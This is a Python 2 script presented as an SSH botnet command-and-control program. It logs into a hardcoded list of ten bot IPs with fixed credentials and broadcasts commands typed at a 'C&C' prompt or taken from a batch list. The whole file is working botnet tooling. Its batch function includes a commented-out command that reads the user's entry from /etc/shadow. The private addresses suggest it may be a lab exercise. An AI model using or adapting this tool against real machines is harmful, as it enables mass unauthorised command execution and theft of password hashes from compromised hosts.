# ssh-botnet.py

"""
Description:

A SSH botnet command and control program.

Interpreter mode    : Run commands from prompt
Batch mode          : Run pre-defined command(s), they can also be called from the 
                      interpreter mode by executing the command 'batch()'
                      (Not to be confused with the shell command 'batch')

To add a ssh bot, simply add its IP to the clientIP list.

For help with options run:
    $ python ssh-botnet.py -h

"""

import sys
import optparse
import pxssh

# Global
botNet = [] # Contains Client objects

clientIP = ["172.16.211.130", # BOT1
            "172.16.211.131", # BOT2
            "172.16.211.132", # BOT3
            "172.16.211.141", # BOT4
            "172.16.211.140", # BOT5
            "172.16.211.139", # BOT6
            "172.16.211.138", # BOT7
            "172.16.211.137", # BOT8
            "172.16.211.136", # BOT9
            "172.16.211.135", # BOT10
            ]   

class Client:
    def __init__(self, host, user, password):
        self.host       = host
        self.user       = user
        self.password   = password
        self.session    = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            #print e
            print "[-] Error connecting to", self.host, "\n"

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

# Creates and adds a Client object to global botnet list
def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

# Execute the given command for each Client in global botnet list
def botnetCommand(command):
    for client in botNet:
        if client.session != None:
            output = client.send_command(command)
            print "[*] Output from", client.host
            print "[+]", output, "\n"

# Batch mode - create a list of predefined commands to execute
def batch():
    #botnetCommand("uname -v")
    #botnetCommand("sudo cat /etc/shadow | grep $(whoami)")
    botnetCommand("ifconfig | grep inet")

# Interpreter mode - user types each command in a prompt
def imode():
    while 1:
        command = raw_input("SSH Botnet C&C > ")
        if command == "exit":
            exit(0)
        elif command == "batch()":
            batch()
        else:
            botnetCommand(command)

def main():
    # Options parser
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interpreter", \
                      help="run in interpreter mode", \
		      dest="IMODE", default=False, \
		      action="store_true"
		     )
    (opts, args) = parser.parse_args()

    # Initialize botnet clients
    for ip in clientIP:
        addClient(ip, "bot", "password")

    # Send command to all the clients
    if opts.IMODE:
        imode()
    else:
        batch()

if __name__ == "__main__":
    main()

